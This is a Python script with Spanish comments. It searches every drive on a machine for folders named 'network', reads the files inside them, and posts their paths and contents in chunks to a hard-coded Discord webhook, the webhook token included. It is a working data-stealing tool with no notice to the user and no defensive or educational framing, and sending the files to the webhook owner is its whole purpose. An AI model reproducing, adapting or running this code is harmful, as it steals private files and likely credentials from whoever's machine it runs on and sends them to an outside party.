import os
import sys
import requests

# Configuración
TARGET_FOLDER_NAME = "network"
MAX_BYTES = 1024 * 1024   # 1 MB máximo a leer por archivo
PRINT_HEAD_BYTES = 2048   # Máx. caracteres a mostrar por archivo
WEBHOOK_URL = "https://discord.com/api/webhooks/1423841797112856606/QZIdyx-h8VcYZ8aLxg4UYwfp_5rZOChmA8JUPpP1zLWMyoyt2g_5UGQeupSZzPkUwEMZ"

def send_to_discord(message: str):
    """Manda texto al webhook en bloques de código, cortado en <=2000 caracteres."""
    if not message.strip():
        return
    max_len = 1900  # menos de 2000 porque añadimos ``` al inicio/fin
    chunks = [message[i:i+max_len] for i in range(0, len(message), max_len)]
    for chunk in chunks:
        content = f"```{chunk}```"
        try:
            requests.post(WEBHOOK_URL, json={"content": content})
        except Exception as e:
            sys.stderr.write(f"Error enviando a Discord: {e}\n")

def list_roots():
    if os.name == "nt":  # Windows
        from string import ascii_uppercase
        return [f"{letter}:/" for letter in ascii_uppercase if os.path.exists(f"{letter}:/")]
    else:  # Unix / macOS
        return ["/"]

def find_network_dirs(start_path):
    matches = []
    for root, dirs, _ in os.walk(start_path, topdown=True):
        for d in dirs:
            if d.lower() == TARGET_FOLDER_NAME.lower():
                matches.append(os.path.join(root, d))
    return matches

def try_read_file(path):
    try:
        size = os.path.getsize(path)
        to_read = min(size, MAX_BYTES)
        with open(path, "rb") as f:
            data = f.read(to_read)
    except Exception as e:
        return False, f"ERROR ABIERTA: {e}", False

    for enc in ("utf-8", "latin-1", "cp1252"):
        try:
            text = data.decode(enc)
            return True, text, size > to_read
        except Exception:
            continue
    head = data[:PRINT_HEAD_BYTES]
    return False, f"BINARIO NO DECODIFICABLE. Hex: {head.hex()}", size > to_read

def process_network_dir(path):
    count = 0
    send_to_discord(f"=== Leyendo carpeta: {path} ===")
    for root, _, files in os.walk(path):
        for fname in files:
            fpath = os.path.join(root, fname)
            count += 1
            send_to_discord(f"-- Archivo: {fpath}")

            if os.path.islink(fpath):
                send_to_discord("Archivo es un enlace simbólico. Omitiendo.")
                continue

            success, content_or_err, truncated = try_read_file(fpath)
            if success:
                snippet = (content_or_err[:PRINT_HEAD_BYTES] +
                           ("\n\n... (archivo truncado en la salida) ..." if len(content_or_err) > PRINT_HEAD_BYTES else ""))
                if truncated:
                    snippet += "\n\n... (truncado en lectura) ..."
                send_to_discord(snippet)
            else:
                send_to_discord(content_or_err + ("\n\n... (truncado) ..." if truncated else ""))
    if count == 0:
        send_to_discord("No se encontraron archivos dentro de esta carpeta.")
    return count

def main():
    try:
        roots = list_roots()
        if not roots:
            send_to_discord("No se encontraron unidades raíz para explorar.")
            return

        send_to_discord("Unidades/raíces a buscar: " + str(roots))
        all_matches = []
        for r in roots:
            send_to_discord(f"Buscando en: {r} ...")
            try:
                all_matches.extend(find_network_dirs(r))
            except Exception as e:
                send_to_discord(f"Error al buscar en {r}: {e}")

        if not all_matches:
            send_to_discord("No se encontró ninguna carpeta llamada 'network'.")
            return

        send_to_discord(f"Se encontraron {len(all_matches)} carpetas 'network'.")
        total_files = 0
        for ndir in all_matches:
            try:
                total_files += process_network_dir(ndir)
            except Exception as e:
                send_to_discord(f"Error al procesar {ndir}: {e}")

        send_to_discord(f"Proceso terminado. Archivos leídos (intentos): {total_files}")
    except Exception as e:
        send_to_discord(f"ERROR GENERAL: {e}")

if __name__ == "__main__":
    main()